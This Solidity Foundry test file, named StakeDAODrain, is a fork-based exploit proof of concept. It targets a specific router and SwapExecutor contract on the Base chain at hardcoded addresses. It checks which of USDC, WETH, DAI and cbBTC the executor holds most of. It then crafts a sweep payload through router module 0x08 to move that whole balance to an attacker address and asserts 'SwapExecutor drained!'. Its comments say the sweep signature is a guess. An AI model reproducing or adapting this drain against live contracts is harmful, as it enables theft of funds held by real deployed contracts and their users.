// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IRouter {
    function execute(bytes[] calldata calls) external payable returns (bytes[] memory);
    function owner() external view returns (address);
}

contract StakeDAODrain is Test {
    IRouter constant router = IRouter(0x0f542fA75c871EB1b93Ef881b73e46acF733392f);
    
    // FIXED: Correctly Checksummed Address
    address constant SWAP_EXECUTOR = 0x591435c065fce9713c8B112fcBf5Af98b8975cB3;

    address[] TOKENS = [
        0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, // USDC
        0x4200000000000000000000000000000000000006, // WETH
        0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb, // DAI
        0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf  // cbBTC
    ];

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"));
    }

    function testDrainSwapExecutor() public {
        address attacker = address(0xBAD);
        address targetToken;
        uint256 maxBalance = 0;

        // 1. Check SwapExecutor balances
        for (uint i = 0; i < TOKENS.length; i++) {
            uint256 bal = IERC20(TOKENS[i]).balanceOf(SWAP_EXECUTOR);
            console.log("Token:", TOKENS[i], "SwapExecutor Balance:", bal);
            if (bal > maxBalance) {
                maxBalance = bal;
                targetToken = TOKENS[i];
            }
        }

        require(maxBalance > 0, "SwapExecutor holds zero balance of all checked tokens");
        console.log("Targeting token with highest balance:", targetToken);
        console.log("Balance to drain:", maxBalance);

        // 2. Craft payload to call SwapExecutor's sweep/transfer function
        // NOTE: The exact function signature depends on the SwapExecutor implementation.
        // If this reverts, check the SwapExecutor on Basescan for the exact function name.
        bytes memory payload = abi.encodePacked(
            bytes1(uint8(8)), // Module ID 0x08 = RouterModuleEnso
            abi.encodeWithSignature(
                "sweep(address,address)", // Example: sweep token to attacker
                targetToken,
                attacker
            )
        );

        bytes[] memory calls = new bytes[](1);
        calls[0] = payload;

        // 3. Execute as attacker
        vm.prank(attacker);
        console.log("Executing drain...");

        try router.execute(calls) {
            uint256 attackerBalance = IERC20(targetToken).balanceOf(attacker);
            console.log("Attacker balance after drain:", attackerBalance);
            assertEq(attackerBalance, maxBalance, "Drain failed");
            console.log("SUCCESS: SwapExecutor drained!");
        } catch Error(string memory reason) {
            console.log("Drain reverted with reason:", reason);
            revert("Drain failed");
        } catch (bytes memory) {
            console.log("Drain reverted with custom error");
            revert("Drain failed");
        }
    }
}
